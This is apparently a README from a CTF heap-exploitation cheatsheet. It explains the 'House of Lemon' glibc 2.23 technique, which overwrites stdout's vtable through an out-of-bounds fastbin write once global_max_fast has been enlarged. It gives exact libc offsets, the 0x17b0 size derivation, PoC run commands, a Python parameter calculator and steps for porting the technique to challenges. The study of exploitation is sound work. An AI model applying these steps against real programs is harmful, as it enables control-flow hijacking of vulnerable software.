# House of Lemon

## 一句话结论

House of Lemon 是 **glibc 2.23 的标准流劫持链**：先把 `global_max_fast` 改大，再利用 `_int_free` 对 `fastbin_index(size)` 缺少上界检查，让超大 chunk 的 fastbin 头写越过 `main_arena.fastbinsY`，覆盖相邻 `_IO_2_1_stdout_` 的 vtable。原版完整终点在 **2.23 可用，2.24 起失效**。

这不是 House of Prime 的同义词。House of Prime 是 2005 年 *Malloc Maleficarum* 中没有完整实作的理论链；House of Lemon 是 2016 年题目中实际使用的“扩大 `global_max_fast` + fastbin 数组越界 + 标准流对象”组合。

<!-- PRIMITIVE_REQUIREMENTS:START -->
## 原语要求与版本边界

| 项目 | 本手法要求 |
|---|---|
| 最小输入原语 / 信息 | 写大 `global_max_fast`；free 超大 chunk；stdout 邻接目标；旧版可控 vtable |
| 关键环境与不变量 | fastbin index 越界能到标准流；最终 vtable/trigger 可用 |
| 最终输出原语 | OOB heap-pointer 写到 stdout 并劫持 CF |
| 版本边界应如何理解 | 2.24 先硬封 heap fake-vtable 终点，但 2.24～2.36 底层 OOB 投递仍可换目标；2.37 uint8_t `global_max_fast` 再硬封投递本身。必须分两层。 |
<!-- PRIMITIVE_REQUIREMENTS:END -->

## 版本矩阵

| glibc | 结论 | 原因 |
|---|---|---|
| 2.23 | **原版完整链可用** | `_int_free` 的 fastbin 下标无上界检查，且 FILE vtable 还可指向堆。 |
| 2.24～2.36 | **原版 RCE 终点失效；底层 OOB 写思路仍需按构建复核** | 2.24 引入 `IO_validate_vtable`，堆虚表不再被默认接受。修改 `global_max_fast` 后的越界 fastbin 头写本身并未因此自动消失，但必须换目标/终点。 |
| 2.37～2.43 | **该投递原语也失效** | `global_max_fast` 改为 `uint8_t`；它不能再容纳足以产生超大 fastbin 下标的值。 |

发行版可能回移检查，`main_arena`、`global_max_fast` 与 FILE 私有布局也受具体构建影响；实战必须以题目附件 libc 的 Build ID 为准。

## 从源码推导 0x17b0

glibc 2.23 x86-64 版本里相关的关键代码，简化之后大致是这样：

```c
if (size <= get_max_fast()) {
    unsigned int idx = (size >> 4) - 2;
    fb = &av->fastbinsY[idx];
    *fb = p;
}
```

该构建中：

```text
main_arena             = libc + 0x3c3b20
fastbinsY              = main_arena + 0x8
global_max_fast        = libc + 0x3c5848
_IO_2_1_stdout_.vtable = libc + 0x3c4620 + 0xd8

idx  = (stdout_vtable - fastbinsY) / 8 = 0x17a
size = (idx + 2) << 4                 = 0x17c0
request                               = 0x17b0
```

因此，只要 `global_max_fast >= 0x17c0`，执行 `free(malloc(0x17b0))` 就会把 chunk header 的地址写进 stdout 的 vtable 槽位。2.23 还没有对 vtable 做合法区检查，把伪造的 vtable 放在这个 chunk 上就能直接拿到控制流。

## PoC

- [`poc_2.23.c`](./poc_2.23.c)：只在版本精确匹配 `2.23-0ubuntu3_amd64` 时才能正确执行。它把“已经拿到一次 libc 任意写”当作前置条件直接给出，先扩大 `global_max_fast`，再执行超大尺寸的 fastbin 越界写，最后通过 `fflush(stdout)` 跳到 `win()`。

这份 PoC 故意没有再重复实现一遍 unsafe unlink：unsafe unlink 是通用的任意写投递手法，已经在 [`unsafe_unlink`](../unsafe_unlink/README.md) 里单独验证过；这里只保留 Lemon 这个手法本身、最值得在 GDB 里逐步观察的部分。

```bash
cd heap_ultimate_cheatsheet
./tools/prepare_exact_libcs.sh /path/to/glibc-all-in-one
./tools/run_in_docker.sh 2.23 house_of_lemon/poc_2.23.c
```

预期输出：

```text
[+] House of Lemon: stdout 的虚表调用已经劫持到堆上。
```

## Python 离线板子

[`lemon.py`](./lemon.py) 提供 `build_house_of_lemon`，计算已验证 2.23 布局的越界 fastbin 投递参数。

### 函数用途

Lemon 是 2.23 标准流劫持链：

```text
扩大 global_max_fast
-> free 超大 chunk
-> _int_free 中 fastbin_index(size) 越界
-> 把 chunk header 地址写到 _IO_2_1_stdout_.vtable 槽
-> fflush(stdout) 跳入堆上 fake vtable
```

本函数只计算 `request_size`、`chunk_size` 和 `fastbin_index` 是否符合该布局，不执行前置任意写。

### 最小使用示例

```python
from lemon import build_house_of_lemon

plan = build_house_of_lemon(
    stdout_addr=0x7fff4000,          # _IO_2_1_stdout_
    main_arena_addr=0x7fff3000,      # 已泄露 main_arena
    fake_chunk_header_addr=0x5555000,# fake chunk header
)

# 返回 LemonPlan
print(hex(plan.request_size), hex(plan.chunk_size),
      hex(plan.fastbin_index), hex(plan.stdout_vtable_addr))
```

### 对应 PoC

- [`poc_2.23.c`](./poc_2.23.c)，绑定 `2.23-0ubuntu3_amd64` 布局。

### 公式

```text
vtable_slot = stdout_addr + 0xd8
fastbinsY    = main_arena_addr + 0x8
idx          = (vtable_slot - fastbinsY) / 8
chunk_size   = (idx + 2) << 4
request      = chunk_size - 0x10
```

### 参数

| 参数 | 含义 |
|---|---|
| `stdout_addr` | `_IO_2_1_stdout_` 对象地址。 |
| `main_arena_addr` | 已泄露的 `main_arena` 地址。 |
| `fake_chunk_header_addr` | 预期写入 stdout vtable 槽的堆 fake chunk header 地址。 |
| `request_size` | 申请大小，默认 `0x17b0`；PoC 分支固定。 |
| `global_max_fast` | 需先由题目原语写入的上限，默认 `0x2000`。 |

### 返回对象 `LemonPlan`

| 字段 | 含义 |
|---|---|
| `request_size` | 要 malloc 的请求大小。 |
| `chunk_size` | 对应物理 chunk size。 |
| `fastbin_index` | 计算出的越界 fastbin 下标。 |
| `stdout_vtable_addr` | `stdout_addr + 0xd8`。 |
| `fake_vtable_addr` | 传入的 fake chunk header 地址。 |

若地址关系不满足 `chunk_size == 0x17c0`，函数会直接拒绝。

### 调用者必须提供

```text
一次 libc 任意写扩大 global_max_fast
2.23 目标构建的 stdout/main_arena/global_max_fast 地址
能在 fake chunk 上布置可消费 vtable 槽的能力
```

### 函数不负责

```text
不负责 unsafe unlink 等前置任意写
不生成 fake vtable 内容
不触发 fflush(stdout)
2.24+ 不适用（IO_validate_vtable 封 heap vtable）
```

## 迁移到题目

1. 用 unsafe unlink、unsorted-bin write，或者题目里现成的任意写去扩大 `global_max_fast`；**一定要先分配好这个超大尺寸的 chunk，再去改大该值**，否则这个尺寸对应的 `malloc` 路径会提前把 arena 弄坏。
2. 从附件的 ELF 或调试符号重新求出 `main_arena`、`global_max_fast` 和标准流目标槽的地址，再按上面给出的逆推公式重新计算 chunk size,不能直接照搬本文的数值。
3. 伪造的 vtable 要指向 chunk header；`free` 会把旧的 fastbin 头写进 `p->fd`,所以不要把唯一关键的函数指针放在 `user[0]` 这个位置。
4. 2.24 及以后的版本不要照搬这份 heap vtable 的最终触发点；应该先确认新版本里可用的消费路径，而不是只看到 OOB 写成功了就断言整条 House of Lemon 仍然可用。

## 一手资料

- [House of Lemon 原作者题解](https://bbs.kanxue.com/article-446.htm)
- [glibc 2.23 `malloc.c`](https://github.com/bminor/glibc/blob/glibc-2.23/malloc/malloc.c)
- [glibc 2.24 `libioP.h`：`IO_validate_vtable`](https://github.com/bminor/glibc/blob/glibc-2.24/libio/libioP.h)
- [glibc：将 `global_max_fast` 改为 `uint8_t` 的提交](https://sourceware.org/git/?p=glibc.git;a=commit;h=15a94e6668a6d7c5697e805d8d67f1d102d0d52e)
- [Malloc Maleficarum 原文存档](https://gist.github.com/martinstnv/e3541ea15477017a01e278480875acd3)
